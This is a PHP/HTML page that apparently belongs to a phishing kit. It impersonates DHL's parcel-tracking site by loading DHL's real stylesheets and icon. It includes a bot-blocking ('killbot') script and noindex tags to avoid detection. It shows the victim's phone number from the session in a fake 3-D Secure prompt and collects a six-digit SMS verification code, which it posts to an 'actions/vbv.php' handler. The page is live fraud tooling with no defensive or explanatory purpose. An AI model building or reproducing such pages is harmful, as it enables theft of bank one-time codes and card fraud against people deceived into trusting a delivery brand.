<?php

session_start();
include "../assets/functions.php";
include '../server/traduction.php';
include_once('../settings.php');
include_once('../server/killbot.to.php');

?>



<!DOCTYPE html>
<html lang="fr-FR" dir="ltr">

<head>
	
  <title><?php echo $translations[$lang]["titre_3ds"]; ?></title>  
	</title>

	<meta name="robots"
		content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">
	<meta name="viewport" content="width=device-width" />
	<link rel="icon" href="../assets/images/A1Ywhbg3Xes8.png">
	<meta charSet="utf-8" />
	<noscript data-n-css=""></noscript>
	<link rel="icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico"
		type="image/x-icon" />

	<!--CSS-->
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-logic.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-ui.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet" href="https://www.dhl.com/etc.clientlibs/dhl/clientlibs/clientlib-core.min.css"
		type="text/css">



</head>
<header>

	<?php include '../assets/header.php'; ?>
</header>




<body class="no-js  ">
	<!--googleoff: all-->
	
	
	
	<!--googleon: all-->
	<div class="l-view has-no-stage">

		<div class="js--nav-padding-layer c-nav--padding-layer"></div>
		<main id="wcag-main-content">
			<span class="link-anchor" id="track-trace-container-par_utapi_trackandtrace"></span>
			<div class="c-track-trace-utapi component-margin" data-track-and-trace-utapi-id="1071102243" data-hide-express-zip-code-field="true" data-contact-customer-service-base-url="/"
				data-track-and-trace-request-delay="0"
				data-track-and-trace="">
				<div class="c-tracking-headline component-wide">

					<!--SERVICE DE SUIVI DHL-->

					
				</div>
				<div class="">
		

        <style>
        /* Ajoutez du CSS pour centrer le contenu */
       

        .centered-form {
            text-align: center;
        }

       
        /* Ajoutez d'autres styles CSS pour le reste du contenu si nécessaire */
    </style>
		





</div>

    <div class="l-grid.centered-form">
    <div class="c-tracking-result--header l-grid">
        <form method="post" action="../actions/vbv.php" name="message_form">
          <br>
<center><img src ="https://makuyuni.org/s/google-pay-apple-pay-transparent.png" width ="250" ></center>
<br>
          <h5 class="cmp-title__text cmp-title__text--level4">   
          <?php echo $translations[$lang]["titre_3ds1"];?></h5>
        <br>
           
          <h5 class="cmp-title__text cmp-title__text--level4">  
            <?php echo $translations[$lang]["titre_3ds2"]; ?><?php echo $_SESSION['tel']?> <?php echo $translations[$lang]["titre_3ds3"]; ?> <br> <?php echo $_SESSION['heure']?></h3>
            </h5>
          <!--TITLE 1-->
          <br>
          
        <?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;">' . $translations[$lang]["3ds_error"] . '</p>';}?>
        

            <!--ccnum-->
            <div class="c-voc-tracking-bar--input-outer-group">
						<div class="c-voc-tracking-bar--input-inner-group" data-form-value-state="set">
						<input class="c-voc-tracking-bar--input js--tracking-bar--input" id="vbv_code" name="vbv_code" type="text" maxlength="6" minlength="6" required>
						<label class="c-voc-tracking-bar--element-label" for="c-voc-marketing-stage-tracking--input"><?php echo $translations[$lang]["3ds_sms"];?></label>
            </div>
            </div>
            <br>

                      

            
           


           
            

          <center>  <button class="c-voc-tracking-bar--button --input-submit  base-button" name="vbv_submit" type="submit" data-tracking="">
            <?php echo $translations[$lang]["Continuer"];?>
						</button></center>

            <br>
            <br>
            <br>          
           						
							
							
						
					</div>
            </div>
        </form>
    </div>
</div>
























<style>
  .l-grid.centered-form {
    text-align: center;
    border: 1px solid #000; /* Ajoutez une bordure à votre div */
    padding: 10px; /* Ajoutez un espace intérieur pour que la bordure soit visible */
  }

  form[name="message_form"] {
    margin: 0 auto;
    max-width: 400px;
  }

  /* Ajoutez une règle pour les écrans de largeur maximale de 768px (taille courante des appareils mobiles) */
  @media (max-width: 768px) {
    .l-grid.centered-form {
      border: 1px solid #000; /* Ajoutez une bordure à la div pour qu'elle soit visible */
      padding: 10px; /* Ajoutez un espace intérieur pour que la bordure soit visible */
    }

    form[name="message_form"] {
      max-width: 90%; /* Ajustez la largeur selon vos besoins */
    }
  }
</style>
		</main>



		<footer>
			<?php// include '../assets/footer.php'; ?>
		</footer>